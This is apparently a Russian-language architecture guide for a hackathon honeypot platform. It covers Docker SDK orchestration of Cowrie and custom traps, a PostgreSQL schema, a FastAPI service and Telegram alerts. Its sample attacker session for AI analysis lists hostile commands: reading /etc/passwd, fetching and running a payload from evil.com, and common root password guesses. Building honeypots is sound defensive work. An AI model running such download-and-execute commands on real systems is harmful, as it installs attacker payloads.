# 🍯 HoneyForge — Полное Исследование Архитектуры

> Исследование для бэкенд-разработчика (Ростик). Стэк: Python FastAPI + Docker + PostgreSQL + Telegram Bot.

---

## 1. Что такое ханипот и какие бывают типы

### Уровни взаимодействия

| Уровень | Описание | Примеры | Сложность |
|---------|----------|---------|-----------|
| **Low-interaction** | Эмулирует только баннеры/порты сервисов. Атакующий видит "открытый порт", но не может зайти глубже. | OpenCanary, HoneyD | ⭐ Просто |
| **Medium-interaction** | Эмулирует часть протокола (SSH логин, HTTP-формы). Атакующий может ввести логин/пароль, видит фейковый шелл. | Cowrie (SSH/Telnet), Conpot (SCADA) | ⭐⭐ Средне |
| **High-interaction** | Полноценная ОС/сервис в контейнере. Атакующий получает реальный доступ к изолированной среде. | Реальная ОС в Docker, T-Pot | ⭐⭐⭐ Сложно |

### Какие сервисы можно эмулировать

| Сервис | Порт | Зачем | Готовый Docker-образ |
|--------|------|-------|---------------------|
| **SSH** | 22 | Ловим брутфорс, записываем команды | `cowrie/cowrie` |
| **HTTP/HTTPS** | 80/443 | Фейковый веб-сайт, ловим сканеры | Свой контейнер (nginx + логгер) |
| **FTP** | 21 | Фейковый файловый сервер | `dionaea` |
| **SMB** | 445 | Имитация Windows-шары | `dionaea` |
| **MySQL** | 3306 | Ловим попытки подключения к БД | Свой контейнер |
| **RDP** | 3389 | Имитация Windows Remote Desktop | `rdpy` |
| **Telnet** | 23 | IoT устройства, роутеры | `cowrie/cowrie` |
| **SMTP** | 25 | Фейковый почтовый сервер | `mailoney` |

---

## 2. Архитектура HoneyForge

### Общая схема

```
┌──────────────────────────────────────────────────────────────────┐
│                     СЕРВЕР (Proxmox / VPS)                       │
│                                                                  │
│  ┌─────────────────────────────────────────────────────────┐     │
│  │              HoneyForge Backend (FastAPI :4000)          │     │
│  │                                                         │     │
│  │  ┌──────────┐  ┌──────────┐  ┌───────────┐             │     │
│  │  │ Docker   │  │ Trap     │  │ Log       │             │     │
│  │  │ Manager  │  │ Config   │  │ Collector │             │     │
│  │  │ Service  │  │ Service  │  │ Service   │             │     │
│  │  └─────┬────┘  └────┬─────┘  └─────┬─────┘             │     │
│  │        │             │              │                    │     │
│  │  ┌─────▼─────────────▼──────────────▼─────┐             │     │
│  │  │          PostgreSQL Database            │             │     │
│  │  │  (profiles, traps, logs, sessions)      │             │     │
│  │  └────────────────────────────────────────┘             │     │
│  │        │                        │                        │     │
│  │  ┌─────▼────────┐   ┌──────────▼──────────┐             │     │
│  │  │ Telegram Bot  │   │ AI Analyzer (Hermes)│             │     │
│  │  │ Alert Service │   │ (Иван)              │             │     │
│  │  └──────────────┘   └─────────────────────┘             │     │
│  └─────────────────────────────────────────────────────────┘     │
│                          │                                       │
│            Docker Socket │ (/var/run/docker.sock)                 │
│                          ▼                                       │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │              Docker Engine (контейнеры-ловушки)           │    │
│  │                                                          │    │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌─────────┐  │    │
│  │  │ Cowrie   │  │ HTTP     │  │ FTP      │  │ MySQL   │  │    │
│  │  │ SSH:2222 │  │ Trap:8080│  │ Trap:2121│  │ Trap    │  │    │
│  │  │ ──►:22   │  │ ──►:80   │  │ ──►:21   │  │ :3306   │  │    │
│  │  └──────────┘  └──────────┘  └──────────┘  └─────────┘  │    │
│  │                                                          │    │
│  │  Каждый контейнер:                                       │    │
│  │  • Изолирован (network, cgroups, capabilities)           │    │
│  │  • Лимитирован (CPU, RAM, disk)                          │    │
│  │  • Пишет логи в volume → Log Collector                   │    │
│  └──────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐    │
│  │   Фронтенд (Михаил, Даниэль) — Flutter Web / отдельно   │    │
│  │   Общается с FastAPI через REST API                      │    │
│  └──────────────────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────────────────┘
```

### Ключевой принцип: FastAPI управляет Docker через Docker SDK

FastAPI-сервер НЕ является ловушкой. Он — **оркестратор**, который:
1. Принимает команды от фронтенда ("создай SSH-ловушку на порту 22")
2. Через Docker SDK создаёт/запускает/останавливает контейнеры
3. Собирает логи из контейнеров
4. Шлёт алерты в Telegram

---

## 3. Как именно работает Docker-часть (для бэкенда)

### 3.1 Docker SDK for Python (`docker` library)

Это основная библиотека. Она общается с Docker Engine через Unix-сокет `/var/run/docker.sock`.

```bash
pip install docker
```

### 3.2 Базовые операции

```python
import docker

client = docker.from_env()

# === Создать и запустить контейнер-ловушку ===
container = client.containers.run(
    image="cowrie/cowrie",              # Образ ханипота
    name="honeyforge_ssh_trap_1",       # Уникальное имя
    detach=True,                        # Фоновый режим
    ports={"2222/tcp": 22},             # Маппинг: 22 на хосте → 2222 в контейнере
    environment={                       # Конфигурация через ENV
        "COWRIE_TELNET_ENABLED": "no",
        "COWRIE_OUTPUT_JSON": "true",
    },
    mem_limit="256m",                   # Лимит RAM
    cpu_quota=50000,                    # Лимит CPU (50%)
    restart_policy={"Name": "unless-stopped"},
    labels={                            # Метки для фильтрации
        "honeyforge": "true",
        "trap_type": "ssh",
        "trap_id": "uuid-here",
    },
    volumes={                           # Логи в volume
        "cowrie_logs_1": {"bind": "/cowrie/var/log/cowrie", "mode": "rw"}
    },
    # ВАЖНО: security options
    cap_drop=["ALL"],                   # Убираем ВСЕ capabilities
    cap_add=["NET_BIND_SERVICE"],       # Даём только привязку к портам
    read_only=False,                    # Для high-interaction нужен запись
    security_opt=["no-new-privileges"], # Запрет эскалации привилегий
)

# === Получить логи контейнера ===
logs = container.logs(stream=True, follow=True)
for line in logs:
    print(line.decode("utf-8"))
    # → Парсим JSON, пишем в PostgreSQL, шлём в Telegram

# === Список всех ловушек HoneyForge ===
traps = client.containers.list(
    filters={"label": "honeyforge=true"}
)
for trap in traps:
    print(f"{trap.name} | {trap.status} | {trap.labels}")

# === Остановить ловушку ===
container.stop()

# === Удалить ловушку ===
container.remove(force=True)

# === Статус и метрики ===
stats = container.stats(stream=False)
print(f"CPU: {stats['cpu_stats']}")
print(f"RAM: {stats['memory_stats']['usage']}")
```

### 3.3 Стриминг логов в реальном времени

```python
import asyncio
import docker

async def stream_container_logs(container_id: str):
    """Асинхронный стриминг логов из контейнера"""
    client = docker.from_env()
    container = client.containers.get(container_id)
    
    # stream=True возвращает генератор
    for line in container.logs(stream=True, follow=True, timestamps=True):
        log_entry = line.decode("utf-8").strip()
        
        # Парсим JSON лог (Cowrie пишет в JSON)
        try:
            data = json.loads(log_entry)
            event = {
                "timestamp": data.get("timestamp"),
                "src_ip": data.get("src_ip"),
                "event_type": data.get("eventid"),  # e.g. "cowrie.login.success"
                "username": data.get("username"),
                "password": data.get("password"),
                "command": data.get("input"),
                "session": data.get("session"),
            }
            
            # Пишем в PostgreSQL
            await save_log_to_db(event)
            
            # Алерт в Telegram при важном событии
            if data.get("eventid") in ["cowrie.login.success", "cowrie.command.input"]:
                await send_telegram_alert(event)
                
        except json.JSONDecodeError:
            pass  # Не все строки — JSON
```

---

## 4. Структура БД (PostgreSQL)

```sql
-- Профили ловушек (шаблоны)
CREATE TABLE trap_profiles (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name        VARCHAR(255) NOT NULL,        -- "SSH Honeypot", "Web Trap"
    trap_type   VARCHAR(50) NOT NULL,         -- "ssh", "http", "ftp", "smb"
    docker_image VARCHAR(255) NOT NULL,       -- "cowrie/cowrie", "custom/http-trap"
    default_config JSONB DEFAULT '{}',        -- Дефолтный конфиг
    interaction_level VARCHAR(20),            -- "low", "medium", "high"
    description TEXT,
    created_at  TIMESTAMP DEFAULT NOW()
);

-- Развёрнутые ловушки (инстансы)
CREATE TABLE traps (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    profile_id      UUID REFERENCES trap_profiles(id),
    container_id    VARCHAR(64),              -- Docker container ID
    container_name  VARCHAR(255),
    status          VARCHAR(20) DEFAULT 'stopped', -- running, stopped, error
    host_port       INTEGER NOT NULL,          -- Порт на хосте
    container_port  INTEGER NOT NULL,          -- Порт в контейнере
    config          JSONB DEFAULT '{}',        -- Конфиг этого инстанса
    cpu_limit       VARCHAR(10) DEFAULT '0.5', -- CPU limit
    memory_limit    VARCHAR(10) DEFAULT '256m',-- RAM limit
    created_at      TIMESTAMP DEFAULT NOW(),
    started_at      TIMESTAMP,
    stopped_at      TIMESTAMP
);

-- Журнал событий (логи атак)
CREATE TABLE attack_logs (
    id          BIGSERIAL PRIMARY KEY,
    trap_id     UUID REFERENCES traps(id),
    timestamp   TIMESTAMP NOT NULL,
    src_ip      INET,                          -- IP атакующего
    src_port    INTEGER,
    event_type  VARCHAR(100),                  -- "login.attempt", "command.input"
    severity    VARCHAR(20) DEFAULT 'info',    -- info, warning, critical
    username    VARCHAR(255),                  -- Введённый логин
    password    VARCHAR(255),                  -- Введённый пароль
    command     TEXT,                          -- Выполненная команда
    payload     BYTEA,                         -- Загруженный файл/малварь
    raw_data    JSONB,                         -- Полный сырой лог
    session_id  VARCHAR(100),                  -- ID сессии атакующего
    geo_country VARCHAR(3),                    -- Гео по IP (GeoLite2)
    geo_city    VARCHAR(100),
    created_at  TIMESTAMP DEFAULT NOW()
);

-- Сессии атакующих
CREATE TABLE attack_sessions (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    trap_id         UUID REFERENCES traps(id),
    session_id      VARCHAR(100),
    src_ip          INET,
    started_at      TIMESTAMP,
    ended_at        TIMESTAMP,
    duration_sec    INTEGER,
    total_commands  INTEGER DEFAULT 0,
    risk_score      FLOAT,                     -- Оценка от AI (Hermes)
    ai_analysis     JSONB,                     -- Результат анализа Hermes
    created_at      TIMESTAMP DEFAULT NOW()
);

-- Алерты (для Telegram)
CREATE TABLE alerts (
    id          BIGSERIAL PRIMARY KEY,
    trap_id     UUID REFERENCES traps(id),
    log_id      BIGINT REFERENCES attack_logs(id),
    alert_type  VARCHAR(50),                   -- "brute_force", "malware", "command_exec"
    message     TEXT,
    sent_to_tg  BOOLEAN DEFAULT FALSE,
    sent_at     TIMESTAMP,
    created_at  TIMESTAMP DEFAULT NOW()
);

-- Индексы для быстрого поиска
CREATE INDEX idx_logs_trap_id ON attack_logs(trap_id);
CREATE INDEX idx_logs_src_ip ON attack_logs(src_ip);
CREATE INDEX idx_logs_timestamp ON attack_logs(timestamp);
CREATE INDEX idx_logs_event_type ON attack_logs(event_type);
CREATE INDEX idx_sessions_trap_id ON attack_sessions(trap_id);
```

---

## 5. Структура FastAPI Backend

```
honeyforge/
├── app/
│   ├── __init__.py
│   ├── main.py                  # FastAPI app, CORS, роуты
│   ├── config.py                # Настройки (порт, БД, Telegram токен)
│   ├── database.py              # SQLAlchemy / asyncpg подключение
│   │
│   ├── models/                  # SQLAlchemy модели
│   │   ├── trap_profile.py
│   │   ├── trap.py
│   │   ├── attack_log.py
│   │   ├── attack_session.py
│   │   └── alert.py
│   │
│   ├── schemas/                 # Pydantic схемы (валидация)
│   │   ├── trap_profile.py
│   │   ├── trap.py
│   │   ├── log.py
│   │   └── alert.py
│   │
│   ├── api/                     # Роуты API
│   │   ├── v1/
│   │   │   ├── profiles.py      # CRUD профилей ловушек
│   │   │   ├── traps.py         # Управление ловушками (deploy/stop/delete)
│   │   │   ├── logs.py          # Получение логов, фильтрация
│   │   │   ├── dashboard.py     # Статистика для дашборда
│   │   │   └── alerts.py        # Управление алертами
│   │   └── websocket.py         # WebSocket для реалтайм логов
│   │
│   ├── services/                # Бизнес-логика
│   │   ├── docker_manager.py    # Управление Docker контейнерами
│   │   ├── log_collector.py     # Сбор и парсинг логов
│   │   ├── telegram_bot.py      # Отправка алертов в Telegram
│   │   ├── geo_ip.py            # GeoIP lookup
│   │   └── ai_analyzer.py       # Интерфейс к Hermes (Иван)
│   │
│   └── core/
│       ├── security.py          # JWT auth (опционально)
│       └── events.py            # Startup/shutdown events
│
├── docker/                      # Dockerfile'ы для кастомных ловушек
│   ├── http_trap/
│   │   ├── Dockerfile
│   │   ├── nginx.conf
│   │   └── fake_site/           # Фейковый сайт-приманка
│   ├── ftp_trap/
│   │   └── Dockerfile
│   └── mysql_trap/
│       └── Dockerfile
│
├── docker-compose.yml           # Оркестрация всего стэка
├── requirements.txt
├── alembic/                     # Миграции БД
└── .env
```

---

## 6. Ключевые API Endpoints

```python
# === ПРОФИЛИ ЛОВУШЕК ===
POST   /api/v1/profiles/              # Создать профиль
GET    /api/v1/profiles/              # Список профилей
GET    /api/v1/profiles/{id}          # Детали профиля
PUT    /api/v1/profiles/{id}          # Обновить профиль
DELETE /api/v1/profiles/{id}          # Удалить профиль

# === ЛОВУШКИ (ИНСТАНСЫ) ===
POST   /api/v1/traps/                 # Развернуть ловушку из профиля
GET    /api/v1/traps/                 # Список развёрнутых ловушек
GET    /api/v1/traps/{id}             # Детали ловушки + статус контейнера
POST   /api/v1/traps/{id}/start      # Запустить ловушку
POST   /api/v1/traps/{id}/stop       # Остановить ловушку
POST   /api/v1/traps/{id}/restart    # Перезапустить
DELETE /api/v1/traps/{id}            # Удалить ловушку (+ контейнер)
GET    /api/v1/traps/{id}/stats      # Метрики (CPU, RAM, network)

# === ЛОГИ ===
GET    /api/v1/logs/                  # Все логи (пагинация, фильтры)
GET    /api/v1/logs/trap/{trap_id}    # Логи конкретной ловушки
GET    /api/v1/logs/ip/{ip}           # Логи по IP атакующего
WS     /api/v1/ws/logs/{trap_id}      # WebSocket: реалтайм логи

# === ДАШБОРД ===
GET    /api/v1/dashboard/stats        # Общая статистика
GET    /api/v1/dashboard/top-ips      # Топ атакующих IP
GET    /api/v1/dashboard/geo          # Геокарта атак
GET    /api/v1/dashboard/timeline     # Таймлайн активности

# === АЛЕРТЫ ===
GET    /api/v1/alerts/                # Список алертов
POST   /api/v1/alerts/config         # Настройка правил алертов
```

---

## 7. Docker Compose для всего стэка

```yaml
version: "3.9"

services:
  # === HoneyForge Backend ===
  honeyforge-api:
    build: .
    container_name: honeyforge-api
    ports:
      - "4000:4000"
    environment:
      - DATABASE_URL=postgresql+asyncpg://honeyforge:secret@postgres:5432/honeyforge
      - TELEGRAM_BOT_TOKEN=${TG_BOT_TOKEN}
      - TELEGRAM_CHAT_ID=${TG_CHAT_ID}
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # ← КЛЮЧЕВОЙ МОМЕНТ!
      - ./trap_logs:/app/trap_logs
    depends_on:
      - postgres
    restart: unless-stopped
    networks:
      - honeyforge-internal

  # === PostgreSQL ===
  postgres:
    image: postgres:16-alpine
    container_name: honeyforge-db
    environment:
      POSTGRES_DB: honeyforge
      POSTGRES_USER: honeyforge
      POSTGRES_PASSWORD: secret
    volumes:
      - pgdata:/var/lib/postgresql/data
    ports:
      - "5432:5432"  # Только для дебага, в проде убрать!
    restart: unless-stopped
    networks:
      - honeyforge-internal

  # === Пример: SSH ловушка (Cowrie) — шаблон ===
  # Эти контейнеры создаются ДИНАМИЧЕСКИ через Docker SDK,
  # но вот пример как бы выглядел в compose:
  #
  # cowrie-ssh:
  #   image: cowrie/cowrie
  #   ports:
  #     - "22:2222"
  #   volumes:
  #     - cowrie_logs:/cowrie/var/log/cowrie
  #   labels:
  #     honeyforge: "true"
  #     trap_type: "ssh"

volumes:
  pgdata:

networks:
  honeyforge-internal:
    driver: bridge
  
  # Отдельная сеть для ловушек — изоляция!
  honeyforge-traps:
    driver: bridge
    internal: false  # Нужен доступ снаружи для атакующих
```

> [!IMPORTANT]
> **Ключевой момент:** FastAPI-контейнер монтирует `/var/run/docker.sock` — это даёт ему доступ к Docker Engine на хосте. Через Docker SDK он может создавать, запускать, останавливать другие контейнеры (ловушки).

---

## 8. Сервис управления Docker (для твоего кода)

```python
# app/services/docker_manager.py

import docker
from docker.errors import NotFound, APIError
from typing import Optional
import uuid

class DockerManager:
    """Управление Docker-контейнерами ловушек"""
    
    def __init__(self):
        self.client = docker.from_env()
        self.label_prefix = "honeyforge"
    
    def deploy_trap(
        self,
        profile: dict,    # Профиль из БД
        host_port: int,    # Порт на хосте
        config: dict = {},
    ) -> dict:
        """Развернуть новую ловушку"""
        
        trap_id = str(uuid.uuid4())
        container_name = f"honeyforge_{profile['trap_type']}_{trap_id[:8]}"
        
        try:
            container = self.client.containers.run(
                image=profile["docker_image"],
                name=container_name,
                detach=True,
                ports={
                    f"{profile.get('container_port', 2222)}/tcp": host_port
                },
                environment=config.get("env", {}),
                mem_limit=config.get("memory_limit", "256m"),
                cpu_quota=config.get("cpu_quota", 50000),
                restart_policy={"Name": "unless-stopped"},
                labels={
                    f"{self.label_prefix}": "true",
                    f"{self.label_prefix}.trap_id": trap_id,
                    f"{self.label_prefix}.trap_type": profile["trap_type"],
                    f"{self.label_prefix}.profile_id": str(profile["id"]),
                },
                cap_drop=["ALL"],
                cap_add=["NET_BIND_SERVICE"],
                security_opt=["no-new-privileges"],
                network="honeyforge-traps",
            )
            
            return {
                "trap_id": trap_id,
                "container_id": container.id,
                "container_name": container_name,
                "status": "running",
                "host_port": host_port,
            }
            
        except APIError as e:
            raise Exception(f"Docker error: {e}")
    
    def stop_trap(self, container_id: str) -> bool:
        """Остановить ловушку"""
        try:
            container = self.client.containers.get(container_id)
            container.stop(timeout=10)
            return True
        except NotFound:
            return False
    
    def remove_trap(self, container_id: str) -> bool:
        """Удалить ловушку и контейнер"""
        try:
            container = self.client.containers.get(container_id)
            container.remove(force=True)
            return True
        except NotFound:
            return False
    
    def get_trap_status(self, container_id: str) -> Optional[dict]:
        """Получить статус и метрики ловушки"""
        try:
            container = self.client.containers.get(container_id)
            stats = container.stats(stream=False)
            
            return {
                "status": container.status,
                "cpu_percent": self._calc_cpu_percent(stats),
                "memory_usage_mb": stats["memory_stats"].get("usage", 0) / 1024 / 1024,
                "memory_limit_mb": stats["memory_stats"].get("limit", 0) / 1024 / 1024,
                "network_rx_bytes": sum(
                    v.get("rx_bytes", 0) 
                    for v in stats.get("networks", {}).values()
                ),
                "network_tx_bytes": sum(
                    v.get("tx_bytes", 0) 
                    for v in stats.get("networks", {}).values()
                ),
            }
        except NotFound:
            return None
    
    def list_all_traps(self) -> list:
        """Список всех ловушек HoneyForge"""
        containers = self.client.containers.list(
            all=True,
            filters={"label": f"{self.label_prefix}=true"}
        )
        return [
            {
                "container_id": c.id,
                "name": c.name,
                "status": c.status,
                "trap_type": c.labels.get(f"{self.label_prefix}.trap_type"),
                "trap_id": c.labels.get(f"{self.label_prefix}.trap_id"),
                "ports": c.ports,
            }
            for c in containers
        ]
    
    def get_trap_logs(self, container_id: str, tail: int = 100):
        """Получить последние N строк логов"""
        try:
            container = self.client.containers.get(container_id)
            return container.logs(tail=tail, timestamps=True).decode("utf-8")
        except NotFound:
            return ""
    
    def stream_trap_logs(self, container_id: str):
        """Генератор для стриминга логов (для WebSocket)"""
        try:
            container = self.client.containers.get(container_id)
            for line in container.logs(stream=True, follow=True, timestamps=True):
                yield line.decode("utf-8").strip()
        except NotFound:
            yield '{"error": "container not found"}'
    
    @staticmethod
    def _calc_cpu_percent(stats: dict) -> float:
        """Рассчитать % использования CPU"""
        cpu_delta = (
            stats["cpu_stats"]["cpu_usage"]["total_usage"]
            - stats["precpu_stats"]["cpu_usage"]["total_usage"]
        )
        system_delta = (
            stats["cpu_stats"]["system_cpu_usage"]
            - stats["precpu_stats"]["system_cpu_usage"]
        )
        if system_delta > 0 and cpu_delta > 0:
            cpu_count = stats["cpu_stats"]["online_cpus"]
            return (cpu_delta / system_delta) * cpu_count * 100.0
        return 0.0
```

---

## 9. Telegram Bot — Алерты

```python
# app/services/telegram_bot.py

import httpx
from app.config import settings

class TelegramAlertService:
    """Отправка алертов об атаках в Telegram"""
    
    def __init__(self):
        self.bot_token = settings.TELEGRAM_BOT_TOKEN
        self.chat_id = settings.TELEGRAM_CHAT_ID
        self.api_url = f"https://api.telegram.org/bot{self.bot_token}"
    
    async def send_alert(self, event: dict):
        """Отправить алерт о событии"""
        
        severity_emoji = {
            "info": "ℹ️",
            "warning": "⚠️",
            "critical": "🚨",
        }
        
        emoji = severity_emoji.get(event.get("severity", "info"), "ℹ️")
        
        message = f"""
{emoji} <b>HoneyForge Alert</b>

🪤 <b>Ловушка:</b> {event.get('trap_name', 'Unknown')}
📡 <b>Тип:</b> {event.get('trap_type', 'Unknown')}
🎯 <b>Событие:</b> <code>{event.get('event_type', '')}</code>

👤 <b>Атакующий IP:</b> <code>{event.get('src_ip', 'N/A')}</code>
🌍 <b>Гео:</b> {event.get('geo_country', '??')} {event.get('geo_city', '')}
🕐 <b>Время:</b> {event.get('timestamp', '')}

{self._format_details(event)}
"""
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{self.api_url}/sendMessage",
                json={
                    "chat_id": self.chat_id,
                    "text": message.strip(),
                    "parse_mode": "HTML",
                }
            )
    
    def _format_details(self, event: dict) -> str:
        """Детали в зависимости от типа"""
        details = []
        if event.get("username"):
            details.append(f"👤 Login: <code>{event['username']}</code>")
        if event.get("password"):
            details.append(f"🔑 Password: <code>{event['password']}</code>")
        if event.get("command"):
            details.append(f"💻 Command: <code>{event['command']}</code>")
        return "\n".join(details) if details else ""
```

---

## 10. Готовые Docker-образы ханипотов (можно использовать сразу)

| Образ | Протокол | Описание | Docker Hub |
|-------|----------|----------|------------|
| `cowrie/cowrie` | SSH, Telnet | Самый популярный SSH-ханипот. Логирует пароли, команды, загрузки | ✅ Official |
| `dinotools/dionaea` | SMB, HTTP, FTP, MSSQL, MySQL, SIP | Мультипротокольный ханипот для ловли малвари | ✅ |
| `thinkst/opencanary` | SSH, HTTP, FTP, SMB, MySQL, RDP, Git, Redis | Low-interaction, лёгкий, на Python, JSON логи | ✅ |
| `mushorg/conpot` | SCADA, Modbus, S7, BACnet | Промышленные системы (ICS/SCADA) | ✅ |
| `buffer/thug` | HTTP | Клиентский ханипот для анализа вредоносных URL | ✅ |
| `dtagdevsec/tpotce` | ВСЕ | Мега-платформа от Deutsche Telekom (30+ ханипотов) | ✅ |

---

## 11. Кастомный HTTP Honeypot (сайт-приманка)

Это ловушка с фейковым сайтом, который выглядит как реальный. Логирует все запросы.

```dockerfile
# docker/http_trap/Dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 8080
CMD ["python", "server.py"]
```

```python
# docker/http_trap/server.py
"""Кастомный HTTP-ханипот: фейковый сайт + полное логирование"""

from fastapi import FastAPI, Request
from datetime import datetime
import json
import sys

app = FastAPI()

@app.middleware("http")
async def log_all_requests(request: Request, call_next):
    """Логируем АБСОЛЮТНО ВСЁ"""
    body = await request.body()
    
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "src_ip": request.client.host,
        "src_port": request.client.port,
        "method": request.method,
        "url": str(request.url),
        "path": request.url.path,
        "headers": dict(request.headers),
        "query_params": dict(request.query_params),
        "cookies": dict(request.cookies),
        "user_agent": request.headers.get("user-agent", ""),
        "body": body.decode("utf-8", errors="replace") if body else None,
    }
    
    # Пишем в stdout → Docker ловит через `docker logs`
    print(json.dumps(log_entry), flush=True)
    
    response = await call_next(request)
    return response

@app.get("/")
async def fake_login_page():
    """Фейковая страница логина"""
    return """<html>
    <head><title>Admin Panel</title></head>
    <body>
        <h1>System Login</h1>
        <form method="POST" action="/login">
            <input name="username" placeholder="Username">
            <input name="password" type="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    </body></html>"""

@app.post("/login")
async def fake_login(request: Request):
    """Ловим креды"""
    form = await request.form()
    # Логирование уже произошло в middleware
    return {"status": "error", "message": "Invalid credentials"}

@app.api_route("/{path:path}", methods=["GET","POST","PUT","DELETE","PATCH"])
async def catch_all(path: str):
    """Ловим ВСЕ запросы"""
    return {"status": "ok"}
```

---

## 12. Безопасность контейнеров-ловушек

> [!CAUTION]
> Ханипот — это сервер, куда СПЕЦИАЛЬНО заходят хакеры. Изоляция критична!

### Чек-лист безопасности

| Мера | Как реализовать | Зачем |
|------|----------------|-------|
| **Drop ALL capabilities** | `cap_drop=["ALL"]` | Атакующий не сможет делать привилегированные операции |
| **No new privileges** | `security_opt=["no-new-privileges"]` | Запрет эскалации через setuid |
| **Resource limits** | `mem_limit="256m"`, `cpu_quota=50000` | Не дать ханипоту съесть весь сервер |
| **Read-only FS** | `read_only=True` (для low-interaction) | Ограничить запись |
| **Isolated network** | Отдельная Docker network | Ловушки не видят основную сеть |
| **No host networking** | Не использовать `network_mode="host"` | Изоляция сетевого стэка |
| **Disk quota** | `storage_opt={"size": "1G"}` | Ограничить диск |
| **PID limit** | `pids_limit=100` | Защита от fork-бомб |
| **Auto-restart** | `restart_policy={"Name": "unless-stopped"}` | Если атакующий крашнет — перезапуск |

---

## 13. Интеграция с AI (Hermes) — Что дать Ивану

### Данные, которые AI анализирует:

```python
# Пример данных для ML-модели
ai_input = {
    "session": {
        "src_ip": "185.220.101.42",
        "duration_sec": 347,
        "commands": [
            "whoami",
            "uname -a", 
            "cat /etc/passwd",
            "wget http://evil.com/payload.sh",
            "chmod +x payload.sh",
            "./payload.sh"
        ],
        "login_attempts": [
            {"username": "root", "password": "admin"},
            {"username": "root", "password": "123456"},
            {"username": "root", "password": "toor"},
        ],
        "files_downloaded": ["payload.sh"],
        "protocols_used": ["ssh"],
        "geo": {"country": "DE", "city": "Frankfurt"},
    }
}

# Что AI должен вернуть:
ai_output = {
    "risk_score": 0.92,                    # 0-1, насколько опасно
    "attack_type": "automated_botnet",     # Тип атаки
    "classification": "malware_delivery",  # Классификация
    "is_bot": True,                        # Бот или человек
    "recommended_action": "block_ip",      # Рекомендация
    "similar_attacks": [...],              # Похожие атаки из базы
    "summary": "Automated SSH brute-force followed by malware download..."
}
```

### API для Ивана (endpoint)

```python
# AI получает данные через FastAPI endpoint
@router.post("/api/v1/ai/analyze-session")
async def analyze_session(session_data: SessionData):
    """Иван подключает сюда свою модель Hermes"""
    result = await hermes_client.analyze(session_data)
    
    # Сохраняем результат
    await db.update_session(session_data.session_id, ai_analysis=result)
    
    # Если risk_score > 0.8 → алерт в Telegram
    if result.risk_score > 0.8:
        await telegram.send_alert({...})
    
    return result
```

---

## 14. Flowchart: Как всё работает вместе

```
Атакующий                HoneyForge               Ваша команда
─────────              ────────────              ─────────────
    │                        │                        │
    │  scan port 22          │                        │
    │──────────────────────► │                        │
    │                   [Docker: cowrie              │
    │                    контейнер ловит]             │
    │  ssh root@target       │                        │
    │──────────────────────► │                        │
    │                   [Cowrie: фейковый шелл]       │
    │  password: admin       │                        │
    │──────────────────────► │                        │
    │                   [LOG → PostgreSQL]             │
    │                   [ALERT → Telegram] ─────────► 📱 Уведомление
    │  whoami                │                        │
    │──────────────────────► │                        │
    │                   [LOG → PostgreSQL]             │
    │                   [→ WebSocket → Frontend] ───► 🖥️ Дашборд
    │  wget malware.sh       │                        │
    │──────────────────────► │                        │
    │                   [LOG + FILE → PostgreSQL]      │
    │                   [→ AI Hermes] ──────────────► 🤖 Анализ
    │                   [CRITICAL ALERT → TG] ──────► 🚨 Алерт
    │                        │                        │
```

---

## 15. Зависимости (requirements.txt)

```txt
fastapi==0.115.0
uvicorn[standard]==0.30.0
docker==7.1.0
asyncpg==0.29.0
sqlalchemy[asyncio]==2.0.35
alembic==1.13.0
pydantic==2.9.0
pydantic-settings==2.5.0
httpx==0.27.0
python-multipart==0.0.12
websockets==13.1
geoip2==4.8.0
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4
```

---

## 16. Первые шаги — с чего начать прямо сейчас

> [!TIP]
> **Порядок действий на хакатоне:**

### Фаза 1 (2-3 часа) — MVP Backend
1. `pip install fastapi uvicorn docker asyncpg sqlalchemy`
2. Создать структуру проекта
3. Написать `DockerManager` (deploy/stop/list)
4. Написать 3 API эндпоинта: POST /traps, GET /traps, DELETE /traps/{id}
5. Проверить что `client.containers.run("cowrie/cowrie", ...)` работает

### Фаза 2 (2-3 часа) — Логирование
1. Подключить PostgreSQL
2. Написать `LogCollector` — фоновая задача, читает `container.logs(stream=True)`
3. Парсит JSON логи Cowrie → пишет в `attack_logs`
4. WebSocket endpoint для фронта

### Фаза 3 (1-2 часа) — Telegram + Алерты
1. Создать бота через @BotFather
2. Реализовать `TelegramAlertService`
3. При `login.success` или `command.input` → алерт в ЛС

### Фаза 4 — AI + Polish
1. Иван подключает Hermes к `/api/v1/ai/analyze-session`
2. Фронт показывает дашборд
3. Тесты, демо

---

## 17. Proxmox (для Ростика)

Если сервер на Proxmox:
- Docker ставится **внутри LXC-контейнера** или **VM**
- LXC: нужен **privileged** контейнер или nested virtualization
- Рекомендация: создать Ubuntu VM в Proxmox → поставить Docker → развернуть HoneyForge
- Proxmox API (`proxmoxer` Python library) можно использовать для автоматизации создания VM, но для хакатона это overkill — достаточно одной VM с Docker
